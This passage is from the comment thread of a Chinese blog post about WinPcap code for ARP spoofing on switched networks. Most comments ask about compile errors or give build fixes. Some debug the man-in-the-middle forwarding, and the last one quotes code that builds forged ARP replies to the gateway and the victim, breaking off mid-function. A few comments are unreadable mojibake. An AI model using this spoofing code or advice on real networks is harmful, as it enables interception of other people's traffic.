+<br>能帮忙解决下不？&nbsp;&nbsp;<a onclick='return SetReplyAuhor("abc")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=abc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl66_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl66$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl66_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#32122">#</a>&nbsp;<a name="32122"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-09-13 13:35
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl67_NameLink" target="_blank">abc</a>
+					</div>
+					<div class="postText">
+						直接注释掉wspiapi.h中出错的那行代码以及其前面的那行代码，可以编译通过并执行，但是这种解决方法不太科学啊，有没有更好的解决方法？&nbsp;&nbsp;<a onclick='return SetReplyAuhor("abc")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=abc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl67_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl67$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl67_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#32123">#</a>&nbsp;<a name="32123"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-09-13 13:35
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl68_NameLink" target="_blank">abc</a>
+					</div>
+					<div class="postText">
+						@abc
+<br>直接注释掉wspiapi.h中出错的那行代码以及其前面的那行代码，可以编译通过并执行，但是这种解决方法不太科学啊，有没有更好的解决方法？&nbsp;&nbsp;<a onclick='return SetReplyAuhor("abc")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=abc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl68_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl68$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl68_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#35847">#</a>&nbsp;<a name="35847"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-11-04 11:36
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl69_NameLink" target="_blank">流氓兔</a>
+					</div>
+					<div class="postText">
+						     saga博主 很高兴能看到你的代码 对我帮助很大 不过有一点问题好像 其中arpsproof代码里的unsigned int _stdcall transmitandsniffer(void *x)这个函数里有两句*(unsigned long *)(pkt_data+30) 代码第483和493行，这里“+30”是不是有一点问题？是什么意思啊？个人觉得应该改成“+38”，即截到包里面的目的ip地址。你看是不是应该这样？
+<br>    另外不知道你有没有观察过这个程序的运行，我在运行arpsproof同时用earthreal观察网卡所截并转发的包。我的试验环境是3台电脑：a向b不断发ip包（自始至终不停止，我们无需管a），我在c上运行arpsproof欺诈b，让a发给b的包先由网管发到我这里，然后我再发给b，并在c上运行eartheal观察。但我欺诈b后也就是输入b后，earthreal在c上并没有截到a发给b的ip包，就截到c为了欺诈b而不停发给b和网关的<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺诈包，这点很纳闷，我觉得应该发了几次欺诈包以后，b和网关应该都被欺诈了，a到b的包应该被网关转发到c这里了，可就是没有一个包。奇怪的问题并没有结束!当我输入-b，也就是停止对b欺诈后，c上先截到几个c到b和网关的欺诈恢复包，这个没问题；可之后c就狂收到a发给b的ip包，经过1，2分钟后又收不到了，一切恢复正常了。这个相当奇怪，之前欺诈时c收不到a到b的包，现在停止欺诈了反而像欺诈成功一样，不过就只维持1，2分钟时间。经我分析是
+<br>if(pcap_sendpacket(slecadopt,rsendbuftogate,42)!=0)
+<br>这句代码导致的问题，因为另一句注释掉仍然会发生这情况。但这句恢复语句没任何问题，到底是什么原因呢？？望博主和大家感兴趣的话能一起来分析一下，这个问题我觉得相当奇怪，但也很有意思。大家搞明白了后肯定受益匪浅！！
+<br>我的mail:terrell_tzh@hotmail.com  qq：185849570&nbsp;&nbsp;<a onclick='return SetReplyAuhor("流氓兔")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e6%b5%81%e6%b0%93%e5%85%94" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl69_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl69$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl69_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#37815">#</a>&nbsp;<a name="37815"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-12-04 19:53
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl70_NameLink" target="_blank">饶</a>
+					</div>
+					<div class="postText">
+						恩，我也遇到error C2011: 'in6_addr' : 'struct' type redefinition这个问题，能帮助解决一下么？真的很奇怪，希望高人指点一下啊  小弟刚学习winpcap啊，对这些不是太熟悉&nbsp;&nbsp;<a onclick='return SetReplyAuhor("饶")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%a5%b6" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl70_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl70$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl70_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#49113">#</a>&nbsp;<a name="49113"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2008-05-07 12:30
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl71_NameLink" target="_blank">在乎谁</a>
+					</div>
+					<div class="postText">
+						为什么运行时有错误啊&nbsp;&nbsp;<a onclick='return SetReplyAuhor("在乎谁")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e5%9c%a8%e4%b9%8e%e8%b0%81" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl71_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl71$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl71_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#49114">#</a>&nbsp;<a name="49114"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2008-05-07 12:30
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl72_NameLink" target="_blank">在乎谁</a>
+					</div>
+					<div class="postText">
+						为什么运行时候有错误啊&nbsp;&nbsp;<a onclick='return SetReplyAuhor("在乎谁")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e5%9c%a8%e4%b9%8e%e8%b0%81" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl72_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl72$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl72_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#50538">#</a>&nbsp;<a name="50538"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2008-05-20 17:50
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl73_NameLink" target="_blank">暖暖</a>
+					</div>
+					<div class="postText">
+						首先谢谢您的帮助,我运行了您的可执行文件,没错,原代码编译的时候有一些错。我总结一下自己的修正步骤，希望楼下的朋友看了后有些借鉴：
+<br>
+<br>
+<br>1、从winpcap 的官方网站下winpcap, 安装；
+<br>2、从winpcap 的官方网站下WpdPack，解压后，产生几个文件夹，在vc tools/options/directories/include files/ 加入 WpdPack解压后产生的include；在vc tools/options/directories/library files/加入 WpdPack解压后产生的lib
+<br>3、building-setting-c/c++-category-code generation 
+<br>下面的use runtime library改为debug multithreaded 
+<br>下面的struct member aligment 改为2 bytes 
+<br>在link里面加上wpcap.lib IPHlpApi.lib ws2_32.lib三个文件 
+<br>4、从window官方网站下windows platform sdk ,安装
+<br>5、在vc tools/options/directories/include files/ 加入 c:/program files/microsoft platform sdk/include;vc tools/options/directories/library files/加入 c:/program files/microsoft platform sdk/lib
+<br>6、将c:/program files/microsoft platform sdk/include/Iprtrmib.h 考到
+<br>C:\Program Files\Microsoft Visual Studio\VC98\Include\下，覆盖原来的Iprtrmib.h
+<br>7、将一个头文件里的N6_ADDR' 结构定义注释掉
+<br>8、#pragma comment(lib,"pcap") 
+<br>改成 
+<br>#pragma comment(lib,"wpcap") 
+<br>
+<br>重新编译，基本上就没问题了，我折腾半天出来的。&nbsp;&nbsp;<a onclick='return SetReplyAuhor("暖暖")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e6%9a%96%e6%9a%96" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl73_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl73$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl73_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#50643">#</a>&nbsp;<a name="50643"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2008-05-21 14:31
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl74_NameLink" target="_blank">暖暖</a>
+					</div>
+					<div class="postText">
+						博主 ：您的程序结束欺骗后，被欺骗的 网关<b style="color: black; background-color: rgb(255, 255, 102);">arp</b> -a 能够看到恢复的ip地址和mac，但是网关ping不通这些ip,要过好一会才能ping通，这是为什么呀。网关是windows server 2003的机器，我的需求是要完成全不能中断网关同其它机器间的通讯，嗅探机器要是个透明的第三者，但现在嗅探机器退出的时候有影响，很苦恼呀 。&nbsp;&nbsp;<a onclick='return SetReplyAuhor("暖暖")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e6%9a%96%e6%9a%96" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl74_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl74$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl74_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [ԭ��]��Winpcap��д��һ���ڽ�������ʵ��arp��ƭ�Ĵ���" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#50966">#</a>&nbsp;<a name="50966"></a>re: [ԭ��]��Winpcap��д��һ���ڽ�������ʵ��<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>��ƭ�Ĵ���
+						<span>
+								2008-05-24 20:27
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl75_NameLink" target="_blank">sd</a>
+					</div>
+					<div class="postText">
+						���ˣ��������&nbsp;&nbsp;<a onclick='return SetReplyAuhor("sd")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=sd" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl75_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl75$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl75_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [ԭ��]��Winpcap��д��һ���ڽ�������ʵ��arp��ƭ�Ĵ���" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#50967">#</a>&nbsp;<a name="50967"></a>re: [ԭ��]��Winpcap��д��һ���ڽ�������ʵ��<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>��ƭ�Ĵ���
+						<span>
+								2008-05-24 20:28
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl76_NameLink" target="_blank">sd</a>
+					</div>
+					<div class="postText">
+						错了，程序本身就是错的&nbsp;&nbsp;<a onclick='return SetReplyAuhor("sd")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=sd" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl76_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl76$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl76_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [ԭ��]��Winpcap��д��һ���ڽ�������ʵ��arp��ƭ�Ĵ���" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#50968">#</a>&nbsp;<a name="50968"></a>re: [ԭ��]��Winpcap��д��һ���ڽ�������ʵ��<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>��ƭ�Ĵ���
+						<span>
+								2008-05-24 20:33
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl77_NameLink" target="_blank">sd</a>
+					</div>
+					<div class="postText">
+						可以看出，这个程序被改过了好多，这个程序本身有一个sniffer功能的，就是完成中间人攻击的。就是由sinnfferandtranmmit完成的，但是主人可能由于某方面的原因没有完成他，或者修改他
+<br>还有就是，在给数据包赋值上，没有考虑字节对齐问题，会导致数据包构造是错误的，最终可能导致内存泄漏。
+<br>总体思想是好的，不过问题太多，建议自己加以修改。我已经修改好了
+<br>通过ethereal抓包，分析正确～！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("sd")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=sd" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl77_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl77$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl77_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#50990">#</a>&nbsp;<a name="50990"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2008-05-25 00:27
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl78_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						@暖暖
+<br>结束欺骗后 不要立即关闭程序 应该就行 这个问题我也知道 但是原因不是很清楚&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl78_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl78$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl78_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#66116">#</a>&nbsp;<a name="66116"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2008-11-06 14:08
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl79_NameLink" target="_blank">test</a>
+					</div>
+					<div class="postText">
+						#pragma pack(push)
+<br>#pragma pack(1)
+<br>ethdr定义
+<br>arphdr定义
+<br>#pragma pack(pop)&nbsp;&nbsp;<a onclick='return SetReplyAuhor("test")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=test" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl79_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl79$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl79_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码[未登录]" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#70472">#</a>&nbsp;<a name="70472"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码[未登录]
+						<span>
+								2008-12-26 22:04
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl80_NameLink" target="_blank">1</a>
+					</div>
+					<div class="postText">
+						error C2065: '_beginthreadex' : undeclared identifier
+<br>也不知道你是怎么编译通过的&nbsp;&nbsp;<a onclick='return SetReplyAuhor("1")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=1" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl80_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl80$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl80_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: 求救" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#83076">#</a>&nbsp;<a name="83076"></a>求救
+						<span>
+								2009-05-15 19:56
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl81_NameLink" href="http://a/" target="_top">NN</a>
+					</div>
+					<div class="postText">
+						fatal error C1083: Cannot open include file: 'pcap.h': No such file or directory. 
+<br>为什么回找不到文件呢?wpcap3.1的下载包里面没有什么文件.VC++6.0添加Iinclude 时找不到指定的'pcap.h'.  回复  更多评论 &nbsp;&nbsp;<a onclick='return SetReplyAuhor("NN")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=NN" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl81_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl81$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl81_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: 求救" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#83077">#</a>&nbsp;<a name="83077"></a>求救
+						<span>
+								2009-05-15 20:05
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl82_NameLink" target="_blank">NN</a>
+					</div>
+					<div class="postText">
+						wpcap3.1的下载包里面没有什么文件，VC++6.0调试时，
+<br>fatal error C1083: Cannot open include file: 'pcap.h': No such file or directory
+<br>执行 cl.exe 时出错.
+<br>
+<br>a2.exe - 1 error(s), 0 warning(s)
+<br>
+<br>急得很，网楼主解答，谢谢！！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("NN")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=NN" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl82_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl82$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl82_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: 求救" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#83079">#</a>&nbsp;<a name="83079"></a>求救
+						<span>
+								2009-05-15 20:07
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl83_NameLink" target="_blank">NN</a>
+					</div>
+					<div class="postText">
+						请问一下啊，wpcap3.1的下载后，还需要自己编写pcap.h吗？
+<br>
+<br>谢谢&nbsp;&nbsp;<a onclick='return SetReplyAuhor("NN")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=NN" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl83_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl83$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl83_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#108103">#</a>&nbsp;<a name="108103"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2010-02-20 18:26
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl84_NameLink" target="_blank">laohou</a>
+					</div>
+					<div class="postText">
+						无法定位程序输入点PacketGetReadEvent于动态链接库packet.dll上怎么办？&nbsp;&nbsp;<a onclick='return SetReplyAuhor("laohou")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=laohou" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl84_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl84$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl84_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#116707">#</a>&nbsp;<a name="116707"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码<a name="Post"></a>
+						<span>
+								2010-05-29 22:27
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl85_NameLink" href="http://%e4%bd%8e%e8%b0%83/" target="_top">梦郎</a>
+					</div>
+					<div class="postText">
+						sproof（）函数中我想问问
+<br> for(k=0;k&lt;6;k++)
+<br>    {
+<br>        eth.eh_dst[k]=gateip-&gt;mac[k];
+<br>        eth.eh_src[k]=myip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_sha[k]=myip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tha[k]=gateip-&gt;mac[k];
+<br>    }
+<br>    eth.eh_type=htons(ETH_<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>);
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_hdr=htons(<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>_HARDWARE);
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_pro=htons(ETH_IP);
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_hln=6;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_pln=4;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_opt=htons(<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>_REPLY);
+<br>	<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_spa=spip-&gt;ip;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tpa=gateip-&gt;ip;
+<br>
+<br>	memset(sendbuftogate,0,sizeof(sendbuftogate));
+<br>    memcpy(sendbuftogate,&amp;eth,sizeof(eth));
+<br>    memcpy(sendbuftogate+sizeof(eth),&amp;<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>,sizeof(<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>));
+<br>
+<br>	for(k=0;k&lt;6;k++)
+<br>    {
+<br>        eth.eh_dst[k]=spip-&gt;mac[k];
+<br>        eth.eh_src[k]=myip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_sha[k]=myip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tha[k]=spip-&gt;mac[k];
+<br>    }
+<br>	<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_spa=gateip-&gt;ip;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tpa=spip-&gt;ip;
+<br>
+<br>	memset(sendbuftosp,0,sizeof(sendbuftosp));
+<br>    memcpy(sendbuftosp,&amp;eth,sizeof(eth));
+<br>    memcpy(sendbuftosp+sizeof(eth),&amp;<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>,sizeof(<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>));
+<br>
+<br>	for(k=0;k&lt;6;k++)
